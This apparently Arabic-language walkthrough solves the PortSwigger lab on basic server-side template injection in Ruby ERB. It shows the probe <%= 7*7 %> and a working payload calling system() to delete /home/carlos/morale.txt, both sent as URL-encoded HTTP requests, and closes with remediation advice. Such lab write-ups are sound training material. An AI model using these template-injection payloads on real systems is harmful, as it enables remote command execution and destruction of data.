# [Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

## **`الهدف`**
قم بمراجعة وثائق `ERB` لمعرفة كيف تنفذ كود على السيرفر ثم قم بحذف ملف `morale.txt` الموجود في `Carlos's home directory`.
## **`خطوات الحل`**
بعد الدخول إلى اللاب وعند محاول فتح أول منتج على اليسار 
```http
GET /product?productId=1 HTTP/2
Host: 0ae200b4046c4ab78274f70f00be0074.web-security-academy.net
Cookie: session=cGkvV4872e19GvQ0KFCZ2Bldv0AonCnr
```
سنجد أن استجابة الطلب تقوم بعمل إعادة توجيه إلى مسار `/?message=Unfortunately this product is out of stock`
```http
HTTP/2 302 Found
Location: /?message=Unfortunately this product is out of stock
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
وعندها يتم تنفيذ هذا الطلب تلقائيًا
```http
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
Host: 0ae200b4046c4ab78274f70f00be0074.web-security-academy.net
Cookie: session=cGkvV4872e19GvQ0KFCZ2Bldv0AonCnr
```
سنجد أن الاستجابة تحتوى على هذه الرسالة
```http
<div>
Unfortunately this product is out of stock
</div>
```

ومن خلال وثائق `ERB` وهو القالب المستخدم في هذا اللاب سنجد أن الصيغة التالية يمكن استخدماها لتقييم تعبيير وعرض النتيجة
```Python
 <%= someExpression %>
```

لذلك سنقوم بعمل طلب باستخدام الـ `Payload` التالي :
```Python
<%= 7*7 %>
```
وسنقوم بوضعه كقيمة معلم `message` في الـ `URL` بعد ترميزه
```http
GET /?message=%3c%25%3d%207*7%20%25%3e HTTP/2
Host: 0ae200b4046c4ab78274f70f00be0074.web-security-academy.net
Cookie: session=cGkvV4872e19GvQ0KFCZ2Bldv0AonCnr
```
وسنجد أن الاستجابة تحتوى على `49`
```http
<div>
49
</div>
```

ومن خلال وثائق `Ruby` سكتشف ان دالة `system()` يمكن استخدامها لتنفيذ أى أوامر على نظام التشغيل

لذلك سنقوم بعمل طلب باستخدام الـ `Payload` التالي :
```Python
1<%= system("rm /home/carlos/morale.txt") %>
```
وسنقوم بوضعه كقيمة معلم `message` في الـ `URL` بعد ترميزه لننتهي من حل اللاب
```http
GET /?message=%3c%25%3d%20system(%22rm%20%2fhome%2fcarlos%2fmorale.txt%22)%20%25%3e HTTP/2
Host: 0ae200b4046c4ab78274f70f00be0074.web-security-academy.net
Cookie: session=cGkvV4872e19GvQ0KFCZ2Bldv0AonCnr
```
## **`ترقيع الثغرة`**
يجب ألا يتم بناء القوالب ديناميكيًا باستخدام مدخلات غير موثوقة، وبدلاً من ذلك، نستخدم قالباً ثابتاً، ونمرر مدخلات المستخدم إليه كمتغير.

وإذا كان التطبيق لا يحتاج إلى قوة لغة البرمجة كاملة داخل القالب، فيُفضل استبدال `ERB` (الذي يسمح بتنفيذ أوامر النظام) بمحركات قوالب أكثر تقييداً وأماناً بحيث لا تسمح بتنفيذ أوامر `RCE` بشكل افتراضي.
